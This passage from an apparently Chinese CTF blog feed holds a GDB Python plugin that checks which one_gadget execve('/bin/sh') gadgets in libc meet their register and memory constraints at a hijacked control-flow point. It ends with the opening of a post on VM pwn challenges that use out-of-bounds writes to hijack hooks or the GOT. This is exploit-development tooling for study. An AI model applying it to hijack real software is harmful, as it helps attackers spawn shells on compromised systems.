信息（地址和条件）放到一个元组里面，作为返回列表的一个元素</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    library(str): 当前程序所依赖的 libc 库路径</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    gadgets_info(list): 列表中的元素是元组（装有一组 one_gadget 信息），后续进行条件判断时只需要对该列表进行遍历</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;one_gadget&quot;</span>, library], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">if</span> (result.returncode != <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: &quot;</span>, result.stderr.decode().strip())</span><br><span class="line">        sys.exit(result.returncode)</span><br><span class="line">    gadgets = result.stdout.decode().strip().split(<span class="string">&quot;\n\n&quot;</span>)  <span class="comment"># 将每个gadget的条件和信息都作为一个元素存储到列表中</span></span><br><span class="line">    gadgets_info = []</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        <span class="comment"># 依次对每组元素进行单独的处理</span></span><br><span class="line">        address_line, constraints_line = gadget.strip().split(<span class="string">&quot;\nconstraints:&quot;</span>)</span><br><span class="line">        address = address_line.strip().split()[<span class="number">0</span>]</span><br><span class="line">        constraints = constraints_line.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        gadgets_info.append((address, constraints))</span><br><span class="line">    <span class="keyword">return</span> gadgets_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="keyword">return</span> gdb.parse_and_eval(<span class="string">&#x27;$&#x27;</span>+register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_address_permissions</span>(<span class="params">address</span>):</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap &quot;</span>+<span class="built_in">str</span>(address),to_string=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;There are no mappings for specified address or module&quot;</span> <span class="keyword">in</span> recv_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    recv_data=recv_data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    recv_data=recv_data.strip().split()</span><br><span class="line">    permissions=recv_data[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;w&#x27;</span> <span class="keyword">in</span> permissions:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_got_address_of_libc</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数用来判断目标地址是否为 got_address_of_libc(这个地址是 libc 中具有 rw 权限的首地址)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str):传入的为 one_gadget 需要判断是否为 got_address_of_libc的字符串</span></span><br><span class="line"><span class="string">    例如：</span></span><br><span class="line"><span class="string">    &quot;ebx is the GOT address of libc&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值:</span></span><br><span class="line"><span class="string">    (bool):如果目标地址为 got_address_of_libc 那么返回 True ，反之返回 False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">match</span>=re.findall(<span class="string">&#x27;(\w+) is the GOT address of libc&#x27;</span>,string)</span><br><span class="line">    register_value=get_register_value(<span class="keyword">match</span>[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(register_value) &lt; <span class="number">0</span>:</span><br><span class="line">        register_value=register_value+(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;rw&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            got_address_of_libc=line.split()[<span class="number">0</span>][<span class="number">5</span>:]</span><br><span class="line">            <span class="keyword">if</span> register_value == <span class="built_in">int</span>(got_address_of_libc,<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_writeable_check</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    这个函数的作用是来判断one_gadget中某个地址是否具有可写的权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">        [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">        [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">    例如上面one_gadget的第一个条件  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">    该函数将自己获取rbp-0x78 (如果是单个寄存器也可以进行判断 比如判断rsi当前地址是否具有写的权限) 的地址判断其是否为一个具有写权限的地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str):该参数是one_gadget关于某个地址是否为可写的条件字符串  例如“address rbp-0x78 is writable”</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool): 判断目标地址是否具有可写权限  如果具有写权限则返回True  反之返回False</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    result = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(\w+)&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        result = re.findall(<span class="string">r&#x27;\b\w+\b&#x27;</span>, string)</span><br><span class="line">        result = result[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result)==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        result=result[<span class="number">0</span>]</span><br><span class="line">        register=result[<span class="number">0</span>]</span><br><span class="line">        operator=result[<span class="number">1</span>]</span><br><span class="line">        operand=result[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))-<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))+<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(calc_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result)==<span class="number">3</span>:</span><br><span class="line">        register_value=get_register_value(result)</span><br><span class="line">        <span class="keyword">if</span> register_value==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(register_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value_ptr</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用获取寄存器所指向的值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    register(str):被访问的寄存器名称</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (int):如果寄存器值为0或者寄存器的值为非法地址则返回-1  否则返回寄存器所指向的值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    address = gdb.parse_and_eval(<span class="string">&quot;$&quot;</span> + register)</span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">int</span>.from_bytes(value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_A</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rsp &amp; 0xf == 0&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register)) &amp; <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_B</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rcx == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value=<span class="built_in">int</span>(get_register_value(register))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_C</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;(u16)[rbp] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    condition=condition_list[<span class="number">0</span>]</span><br><span class="line">    register=condition_list[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> condition == <span class="string">&quot;u16&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value_ptr(register))</span><br><span class="line">        <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        calc_value=calc_value &amp; <span class="number">0xffff</span></span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_D</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[[rbp-0x70]] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=re.findall(<span class="string">r&quot;\[(\w+)([+-])(\w+)&quot;</span>, condition_list[<span class="number">0</span>])</span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) - <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> - <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) + <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> + <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_E</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[r10] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value =get_register_value_ptr(register)</span><br><span class="line">    <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_F</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[esp+0x3c] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) + <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) - <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equal_judgement</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数来处理 one_gadget 中的等式判断，我目前发现 one_gadget中的等式一共有六种类型（如下）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;rsp &amp; 0xf == 0&quot;,</span></span><br><span class="line"><span class="string">    &quot;rcx == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;(u16)[rbp] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[[rbp-0x70]] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[r10] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[esp+0x3c] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    我通过正则表达式来识别出这六种情况，并将他们的关键信息匹配出来，再调用其对应的处理函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str): 等式判断条件的字符串，例如 &quot;[esp+0x34] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool): 如果等式成立则返回 True 不成立则返回 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    judgement=[]</span><br><span class="line">    <span class="keyword">match</span>=[]</span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+)\s*(\&amp;)\s*(\w+)&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_A(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\((\w+)\)\[(\w+)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_C(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\[(.*?)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(judgement[<span class="number">0</span>].split(<span class="string">&#x27;[&#x27;</span>)) &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> condition_equal_D(judgement)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">match</span> = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(.*)&#x27;</span>, judgement[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                <span class="keyword">return</span> condition_equal_F(<span class="keyword">match</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+) == NULL&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_B(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;\[(\w+)\] == NULL&quot;</span>,string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_E(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">constraints</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用是将传入的每一组 one_gadget 按照条件进行分类，然后调用更具体的函数进行处理</span></span><br><span class="line"><span class="string">    目前我考虑了 one_gadget 的三种情况，分别是 is writeable 和 is got address of libc 以及对等式的判断</span></span><br><span class="line"><span class="string">    如果使用 l2 参数的话，会有更多的情况，我认为它们概率极小并且条件过于繁多，所以目前没有对它们进行判断</span></span><br><span class="line"><span class="string">    如果之后有条件没有考虑到需要添加的，或者想处理 l2 的 one_gadget 则在这里添加新的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    constraints(list):存储的是一组的 one_gadget 所有信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool)如果当前这组 one_gadget 的所有条件都成立返回 True 反之有一个条件没有满足就返回 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    result1 = []</span><br><span class="line">    <span class="keyword">for</span> constraint <span class="keyword">in</span> constraints:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is writable&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_writeable_check(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is the GOT address of libc&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_got_address_of_libc(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;||&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> constraint.split(<span class="string">&#x27;||&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    result1.append(equal_judgement(i))</span><br><span class="line">            result.append(<span class="built_in">any</span>(result1))</span><br><span class="line">            result1 = []</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> constraint <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(equal_judgement(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget---&gt;&#x27;</span>, result, constraints)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_gadget_cmd</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数为 check_gadget 命令的主函数</span></span><br><span class="line"><span class="string">    该命令实现了对当前位置概率略高的 one_gadget 能否生效做了判断</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    命令使用方法：</span></span><br><span class="line"><span class="string">    如果你想判断劫持执行流的这个位置是否有 one_gadget 能够生效，那么使用 gdb 调试到劫持执行流的地址处</span></span><br><span class="line"><span class="string">    使用该命令就可以看到是否有 one_gadget 能用了</span></span><br><span class="line"><span class="string">    目前只能判断概率较高的 one_gadget 能否使用，无法对 -l2 显示出来的 one_gadget 进行判断</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    check_gadget_cmd() 函数无参且无返回值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    libc_path=get_libc_path()   </span><br><span class="line">    <span class="keyword">if</span> libc_path == <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;Program is a static link!&quot;</span>+<span class="string">&quot;\033[0m\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    all_gadget_info=get_gadget_info(libc_path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(all_gadget_info)):</span><br><span class="line">        gadget_address,gadget_constraints=all_gadget_info[i][<span class="number">0</span>],all_gadget_info[i][<span class="number">1</span>]</span><br><span class="line">        result=check(gadget_constraints)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;Successful one_gadget&quot;</span>+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_address-------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+gadget_address+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_info----------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+<span class="built_in">str</span>(gadget_constraints)+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&quot;define check_gadget\n\tpython check_gadget_cmd()\nend&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>尝试开发小工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title>关于vm pwn的学习总结</title>
    <url>/posts/ccd7886.html</url>
    <content><![CDATA[<p>目前就做了两道vm pwn的题目先简单总结一下，这类题目逆向量较大，如果有分析不懂的函数或者某段指令可以尝试配合gdb动态调试观察某些寄存器或内存值的变化来猜测其功能。漏洞点大多为数组越界可以写或者任意读来劫持hook或者got表等等。不一定每个指令都要具体分析明白，个人认为去关注漏洞指令，其他指令用到哪个去简单分析哪个</p>
<span id="more"></span>

